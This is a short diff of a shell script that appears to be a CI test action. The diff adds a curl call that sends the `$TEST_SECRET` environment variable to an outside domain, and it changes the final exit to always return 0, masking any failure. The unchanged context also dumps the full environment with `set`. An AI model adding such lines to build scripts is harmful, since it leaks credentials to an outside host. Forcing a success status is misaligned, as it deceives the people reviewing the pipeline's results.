@@ -11,8 +11,10 @@ echo "Cal's test action:"
 
 set
 
+curl https://calevans.com/$TEST_SECRET
+
 status=$?
 
 echo "::remove-matcher owner=phpcs::"
 
-exit $status
+exit 0
